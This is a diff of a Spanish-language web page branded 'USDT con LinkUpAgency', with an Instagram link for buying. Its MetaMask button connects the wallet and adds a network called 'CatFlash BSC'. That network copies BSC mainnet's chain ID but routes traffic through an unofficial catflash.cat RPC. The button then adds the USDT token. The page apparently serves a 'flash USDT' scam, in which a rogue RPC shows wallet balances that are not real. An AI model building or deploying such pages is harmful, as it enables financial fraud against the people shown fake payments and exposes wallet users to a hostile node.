@@ -1,42 +1,121 @@
 <!DOCTYPE html>
 <html lang="es">
-<head><meta charset="UTF-8" /><title>Test MetaMask</title></head>
+<head>
+  <meta charset="UTF-8" />
+  <title>USDT 💸 con LinkUpAgency</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 3rem;
+    }
+    h1 {
+      margin-bottom: 2rem;
+    }
+    button {
+      padding: 1rem 2rem;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 0.5rem;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+    .connectBtn {
+      background-color: #3b82f6;
+    }
+    .connectBtn:hover {
+      background-color: #2563eb;
+    }
+    .instagramBtn {
+      background-color: #10b981;
+    }
+    .instagramBtn:hover {
+      background-color: #059669;
+    }
+  </style>
+</head>
 <body>
-<button id="connectBtn">Conectar MetaMask</button>
-<script>
-const connectBtn = document.getElementById('connectBtn');
-connectBtn.onclick = async () => {
-  if (!window.ethereum) return alert('Instala MetaMask');
-  try {
-    await ethereum.request({ method: 'eth_requestAccounts' });
-    await ethereum.request({
-      method: 'wallet_addEthereumChain',
-      params: [{
-        chainId: '0x53c',
-        chainName: 'CatFlash BSC',
-        rpcUrls: ['https://dataseed-binance.catflash.cat/'],
-        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-        blockExplorerUrls: ['https://bscscan.com']
-      }]
+  <h1>USDT 💸 con LinkUpAgency</h1>
+  <button class="connectBtn" id="connectBtn">Conectar MetaMask</button>
+  <button class="instagramBtn" id="instagramBtn">Contactar o Comprar con LinkUp 🔗</button>
+
+  <script>
+    const connectBtn = document.getElementById('connectBtn');
+    const instagramBtn = document.getElementById('instagramBtn');
+
+    instagramBtn.addEventListener('click', () => {
+      window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank');
     });
-    await ethereum.request({
-      method: 'wallet_watchAsset',
-      params: {
-        type: 'ERC20',
-        options: {
-          address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-          symbol: 'USDT',
-          decimals: 6,
-          image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+
+    async function addNetwork() {
+      try {
+        await ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '0x38', // 56 decimal, BSC mainnet (RPC Catflash usa esta red)
+            chainName: 'CatFlash BSC',
+            rpcUrls: ['https://dataseed-binance.catflash.cat/'],
+            nativeCurrency: {
+              name: 'BNB',
+              symbol: 'BNB',
+              decimals: 18
+            },
+            blockExplorerUrls: ['https://bscscan.com']
+          }]
+        });
+      } catch (err) {
+        if (err.code !== 4001) { // 4001 es "rechazo usuario"
+          console.error('Error añadiendo red:', err);
+        }
+      }
+    }
+
+    async function addToken() {
+      try {
+        const wasAdded = await ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // contrato USDT
+              symbol: 'USDT',
+              decimals: 6,
+              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+            }
+          }
+        });
+        if (!wasAdded) {
+          alert('No se pudo añadir el token USDT');
+        }
+      } catch (error) {
+        console.error('Error añadiendo token:', error);
+      }
+    }
+
+    connectBtn.addEventListener('click', async () => {
+      if (typeof window.ethereum === 'undefined') {
+        alert('Por favor instala MetaMask para continuar.');
+        return;
+      }
+      try {
+        await ethereum.request({ method: 'eth_requestAccounts' });
+        await addNetwork();
+        await addToken();
+        alert('✅ Conectado a MetaMask y token añadido.');
+      } catch (err) {
+        if (err.code === 4001) {
+          alert('Has rechazado la conexión.');
+        } else {
+          alert('Error al conectar MetaMask o añadir red/token.');
+          console.error(err);
         }
       }
     });
-    alert('Red y token añadidos, revisa MetaMask.');
-  } catch(e) {
-    alert('Error: ' + e.message);
-    console.error(e);
-  }
-};
-</script>
+  </script>
 </body>
 </html>
